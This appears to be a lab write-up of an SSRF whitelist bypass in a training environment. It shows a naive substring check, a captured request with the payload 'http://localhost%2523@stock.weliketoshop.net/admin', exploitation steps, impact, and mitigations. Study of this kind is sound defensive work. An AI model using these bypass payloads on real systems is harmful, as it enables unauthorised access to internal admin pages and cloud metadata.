# 📘 Scenario 6: SSRF Whitelist Bypass using Special Characters (`@`, `%23`, etc.)

## 🔎 Vulnerability Description

In this scenario, the application has a whitelist mechanism that allows SSRF requests **only if the `stockApi` parameter contains a trusted hostname** such as:

```
 stock.weliketoshop.net 
```

However, the validation is performed **naively by checking if the string appears anywhere in the URL**, and **before URL parsing**. This opens the door for SSRF via **parser confusion**, using characters like `@` and `#` to trick the backend into sending requests to untrusted internal resources.

> **Vulnerability Type:** Insecure Input Validation (Whitelist Bypass)  
> **OWASP Top 10 ID:** A10:2021 – Server-Side Request Forgery  
> **Risk Level:** High  

---

## 🧠 How This Works

Web developers often validate URLs using:

```python
if "stock.weliketoshop.net" in user_input:
    allow_request()
```
In `http://stock.weliketoshop.net@127.0.0.1/admin`, the real request target is `127.0.0.1`

The part before `@` is treated as credentials, not the destination

Similarly, `#` and `%23` can be used to truncate URLs or shift parsing
## 🔧 Target

**SSRF Endpoint:**
🔗 https://0a8b0050041680da800149e900a40036.web-security-academy.net/product/stock

## 📥 HTTP Request

```http
POST /product/stock HTTP/2
Host: 0a8b0050041680da800149e900a40036.web-security-academy.net
Cookie: session=4fRO6noOd3S3f6XW8n7HAxbBYcJ6wa3J
Content-Length: 107
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a8b0050041680da800149e900a40036.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a8b0050041680da800149e900a40036.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
 
stockApi=http://localhost%2523@stock.weliketoshop.net/admin

```
---
## 📥 Server Response
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Set-Cookie: session=3X7ki1Ye5xIUcDzoet2RF7OKactNGrQV; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 3074

```
---

## 🧪 Exploitation Steps

Try `stockApi=http://127.0.0.1/admin` → should be blocked by whitelist.

Use one of the bypass payloads above.

Monitor the response:

If internal data is returned, the bypass was successful.

Confirm that the backend followed the spoofed redirect due to parser confusion.

## 💥 Potential Impact

**Full whitelist bypass**: attacker can send SSRF requests anywhere.

Enables access to:

- Internal admin pages

- Cloud metadata APIs

- Redis, Memcached, or other exposed services

Can be combined with file inclusion or RCE vectors.

## ✅ Mitigation Suggestions
- Do **not** validate URLs using simple substring checks.

- Use secure URL parsing libraries and extract the final destination hostname.

- Normalize, decode, and canonicalize URLs before applying any allowlist logic.

- Block credentials in URLs (`user:pass@host`) unless explicitly allowed.

## 📸 Screenshot

![Exploitation Image Of Scenario 6](https://github.com/hovikhanh/ssrf-demo/images/Picture6.png "Exploitation Image Of Scenario 6")

## 🔗 References

[OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

[PayloadsAllTheThings – SSRF Bypass Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#bypass-techniques)

> 💡 Note: Whitelist-based protections are often vulnerable to evasion. Always resolve and compare the final destination IP after parsing.